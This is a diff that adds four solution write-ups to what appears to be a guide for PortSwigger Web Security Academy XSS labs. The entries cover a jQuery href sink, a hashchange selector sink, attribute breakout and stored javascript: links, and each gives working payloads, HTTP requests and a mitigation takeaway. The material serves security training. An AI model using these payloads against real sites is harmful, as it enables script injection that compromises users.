@@ -131,3 +131,160 @@ Host: target.web-security-academy.net
 6. The JavaScript assigns the payload to `innerHTML`, inserting the `<img>` element into the page. When the browser attempts to load image source `x`, it fails and fires the `onerror` event, triggering the `alert(1)` pop-up.
 
 > **Key Takeaway:** Assigning untrusted input to an `innerHTML` sink allows DOM XSS. Even though modern browsers block standard `<script>` tag execution when inserted via `innerHTML`, attackers easily bypass this by leveraging inline event handlers like `onerror` or `onload`. Use safer properties like `textContent` or `innerText` to safely render user text.
+
+---
+
+### [PS-XSS-05] DOM XSS in jQuery anchor href attribute sink using location.search
+
+**Scenario:** The application uses jQuery to dynamically populate the `href` attribute of a back link on the feedback page using a query parameter (`returnPath`) extracted directly from `location.search`. Because the URL scheme is not validated, an attacker can pass a `javascript:` pseudo-protocol URL into the parameter, causing arbitrary code to execute when a user clicks the link.
+
+**Solution:**
+
+1. Navigate to the **Submit feedback** page on the target site.
+2. Open Browser Developer Tools (F12) and inspect the page source code handling the back link:
+
+```javascript
+$(function() {
+    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+
+```
+
+3. Observe that jQuery's `.attr("href", ...)` function assigns the `returnPath` parameter from `location.search` directly to the `href` attribute of the element with ID `backLink`.
+4. Construct an XSS payload leveraging the `javascript:` URI scheme:
+
+```text
+javascript:alert(1)
+
+```
+
+5. Append the payload to the `returnPath` parameter in the browser address bar:
+
+```http
+GET /feedback?returnPath=javascript:alert(1) HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+6. Inspect the generated anchor tag in the DOM to confirm its update:
+
+```html
+<a id="backLink" href="javascript:alert(1)">Back</a>
+
+```
+
+7. Click the **Back** link on the page. The browser executes the inline JavaScript protocol, triggering the `alert(1)` pop-up.
+
+> **Key Takeaway:** Assigning untrusted user input directly to URL-accepting attributes (`href`, `src`, `action`) creates DOM XSS risks via the `javascript:` pseudo-protocol. To mitigate this, client-side code must enforce strict URL validation—ensuring links start with explicit, safe schemes (`https://`, `http://`) or relative path slashes (`/`) before dynamically inserting them into the DOM.
+
+---
+
+### [PS-XSS-06] DOM XSS in jQuery selector sink using a hashchange event
+
+**Scenario:** The application uses a vulnerable pattern where the jQuery selector function `$()` acts as a DOM execution sink. An event listener bound to the `hashchange` event reads user input from `location.hash` and passes it directly into `$()`. When an attacker delivers a payload via a crafted URL or iframe, jQuery interprets the payload string as HTML elements rather than a CSS selector, executing arbitrary JavaScript.
+
+**Solution:**
+
+1. Open Browser Developer Tools (F12) or view the home page source code to locate the `hashchange` event handler:
+
+```javascript
+$(window).on('hashchange', function() {
+    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+    if (post.length) {
+        post[0].scrollIntoView();
+    }
+});
+
+```
+
+2. Observe that `window.location.hash` is decoded and concatenated inside the `$()` selector function. In vulnerable jQuery implementations, passing HTML tags into `$()` causes jQuery to instantiate those DOM elements and execute inline scripts or handlers.
+3. Access the lab's **Exploit Server**.
+4. In the **Body** text area of the exploit server, craft an `<iframe>` payload that loads the vulnerable site home page and then updates the `src` attribute hash to trigger the `hashchange` event:
+
+```html
+<iframe src="https://target.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+```
+
+5. Click **Store** and then **Deliver exploit to victim**.
+6. When the victim visits the link, the `<iframe>` initially loads the target URL with an empty hash `#`. Once loaded, the `onload` handler appends `<img src=x onerror=print()>` to `this.src`, firing the `hashchange` event. jQuery receives the image payload in `$()`, causing the browser to render the broken image tag and execute `print()`.
+
+> **Key Takeaway:** Passing untrusted user input (such as `location.hash`) into jQuery's `$()` selector function is dangerous because jQuery attempts to parse strings starting with `<` as HTML DOM elements rather than CSS query selectors. Input passed to selectors must be sanitized, strictly validated, or handled using specific DOM selection methods like `Element.querySelector()` rather than overloaded library wrappers.
+
+---
+
+### [PS-XSS-07] Reflected XSS into attribute with angle brackets HTML-encoded
+
+**Scenario:** The application reflects user search queries inside the `value` attribute of an HTML `<input>` tag. While the application HTML-encodes angle brackets (`<` and `>`) to prevent tag creation, it fails to encode double quotes (`"`). This allows an attacker to break out of the attribute string and inject new HTML attributes, such as an event handler (`onfocus`) combined with `autofocus` to execute JavaScript without user interaction.
+
+**Solution:**
+
+1. Enter an arbitrary search string (e.g., `test`) in the search box on the home page.
+2. Inspect the search input element in Browser Developer Tools (F12) to observe how input reflects:
+
+```html
+<input type="text" name="search" value="test">
+
+```
+
+3. Test if double quotes are preserved by searching for `"test`. Inspecting the page DOM confirms the quote is rendered unescaped inside the tag:
+
+```html
+<input type="text" name="search" value=""test">
+
+```
+
+4. Craft an XSS payload that closes the `value` attribute and introduces an event handler along with `autofocus` to execute code automatically upon page load:
+
+```html
+" onfocus="alert(1)" autofocus="
+
+```
+
+5. Submit the payload in the search field or append it to the query parameter:
+
+```http
+GET /?search=%22+onfocus%3D%22alert%281%29%22+autofocus%3D%22 HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+6. Inspect the resulting HTML markup rendered by the server:
+
+```html
+<input type="text" name="search" value="" onfocus="alert(1)" autofocus="">
+
+```
+
+7. When the page loads, `autofocus` automatically places cursor focus on the `<input>` element, triggering `onfocus` and executing `alert(1)`.
+
+> **Key Takeaway:** Sanitization must be context-aware. When reflecting user input inside HTML attributes, encoding angle brackets is ineffective against attribute breakout. Attribute values must have quotes HTML-encoded (e.g., `"` converted to `&quot;` and `'` to `&#x27;`) to prevent attackers from introducing new attributes or event handlers.
+
+---
+
+### [PS-XSS-08] Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+**Scenario:** The application allows users to submit comments with a website URL, which is stored in the database and rendered inside the `href` attribute of an `<a>` tag wrapping the commenter's name. The application HTML-encodes double quotes (`"`), preventing an attacker from breaking out of the attribute. However, because the value is directly inserted into a URL context, an attacker can leverage the `javascript:` pseudo-protocol without needing quotes or angle brackets.
+
+**Solution:**
+
+1. Navigate to any blog post on the target site and locate the **Leave a comment** form.
+2. Fill in the **Comment**, **Name**, and **Email** fields with arbitrary test data.
+3. In the **Website** field, input the following URI payload:
+
+```text
+javascript:alert(1)
+
+```
+
+4. Click **Post comment** and return to the blog post.
+5. Inspect the comment author's link in Browser Developer Tools (F12) to verify how the payload was rendered:
+
+```html
+<a id="author" href="javascript:alert(1)">Commenter Name</a>
+
+```
+
+6. Click the author's name link. The browser evaluates the `javascript:` pseudo-protocol, executing the script and triggering the `alert(1)` pop-up.
+
+> **Key Takeaway:** Encoding double quotes (`&quot;`) prevents attribute breakout, but it fails to secure URL-accepting attributes like `href` or `src`. To prevent XSS in URL contexts, applications must validate that user-supplied input uses safe schemes (`http://`, `https://`) or relative path slashes (`/`) before rendering them into the DOM.
